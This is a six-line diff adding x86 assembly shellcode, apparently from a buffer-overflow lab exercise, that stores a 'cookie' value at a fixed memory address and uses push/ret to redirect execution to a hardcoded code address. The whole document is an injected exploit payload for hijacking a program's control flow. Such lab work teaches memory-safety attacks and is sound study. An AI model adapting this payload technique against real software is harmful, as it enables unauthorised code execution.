@@ -1,0 +1,6 @@
+#move cookie into address where it will be pulled from
+  movl  $0x58c608ec, %ebx
+  movl  $0x0804a1dc, %ecx
+  movl  %ebx, (%ecx)
+  push  $0x080489a2
+  ret
